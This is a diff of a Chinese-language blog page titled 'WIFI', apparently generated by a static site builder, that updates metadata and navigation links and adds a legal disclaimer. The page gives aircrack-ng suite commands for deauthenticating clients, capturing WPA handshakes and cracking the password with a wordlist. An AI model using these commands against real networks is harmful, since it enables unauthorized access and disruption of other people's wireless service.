@@ -21,7 +21,7 @@ Aireplay-ng 强行向目标 AP 发送数据包
 Airmon-ng 开启无线网卡的监视模式
 Wordlists.txt 字典包
 #确认网">
-<meta property="og:updated_time" content="2017-03-15T12:29:52.742Z">
+<meta property="og:updated_time" content="2017-04-02T10:55:16.147Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WIFI">
 <meta name="twitter:description" content="请勿乱用。装备：kali，网卡（监控），8187/3070芯片。使用工具Airodump-ng 获取 AP 的 MAC 信息，连接信息以及是否握手成功。
@@ -144,11 +144,12 @@ Wordlists.txt 字典包
 <h2 id="查看隐藏SSID"><a href="#查看隐藏SSID" class="headerlink" title="查看隐藏SSID"></a>查看隐藏SSID</h2><p>   <code>airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon</code><br>   <code>aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</code></p>
 <h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="http://www.jianshu.com/p/d4da13258f35" target="_blank" rel="external">作者Jglimmers</a><br><a href="http://www.linuxdiyf.com/linux/24060.html" target="_blank" rel="external">作者斗大的熊猫</a></p>
 <h1 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h1><p><code>airmon-ng check kill</code>    #自动检查关闭冲突程序<br><code>airmon-ng start wlan0</code>   #开启监控<br><code>airodump-ng wlan0mon</code>    #获取附近AP信息<br><code>airodump-ng -c [CH] --bssid [BSSID] -w [path] wlan0mon</code> #开始抓包<br><code>aireplay-ng -0 2 -a [BSSID] -c [连入设备的BSSID] wlan0mon</code> #强制重连<br><code>airmon-ng stop wlan0mon</code> #关闭监控<br><code>aircrack-ng -a2 -b [BSSID] -w [path字典] [path.cap]</code> #破解密码<br><code>#get key</code></p>
+<h1 id="WARNING"><a href="#WARNING" class="headerlink" title="WARNING"></a>WARNING</h1><h1 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h1><p>本文仅仅描述了思路，请自觉遵守相关法律法规，任何非法攻击行为导致的后果均与本人无关。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/15/wifi/" data-id="cj0att7g80003gkfwx1bcfrh4" class="article-share-link">Partager</a>
+      <a data-url="http://yoursite.com/2017/03/15/wifi/" data-id="cj0ky67m8000784fwdagaukfh" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -158,9 +159,9 @@ Wordlists.txt 字典包
 <nav id="article-nav">
   
   
-    <a href="/2017/03/12/pil/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2017/03/09/Python-笔记/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Ancien</strong>
-      <div class="article-nav-title">pil</div>
+      <div class="article-nav-title">Python笔记之 PIL库翻译</div>
     </a>
   
 </nav>
@@ -201,11 +202,7 @@ Wordlists.txt 字典包
           </li>
         
           <li>
-            <a href="/2017/03/12/pil/">pil</a>
-          </li>
-        
-          <li>
-            <a href="/2017/03/09/Python-笔记/">Python PIL库翻译</a>
+            <a href="/2017/03/09/Python-笔记/">Python笔记之 PIL库翻译</a>
           </li>
         
           <li>
@@ -214,6 +211,10 @@ Wordlists.txt 字典包
         
           <li>
             <a href="/2017/03/06/markdown基本语法/">markdown基本语法</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/06/一些有趣的网站/">一些有趣的网站</a>
           </li>
         
       </ul>
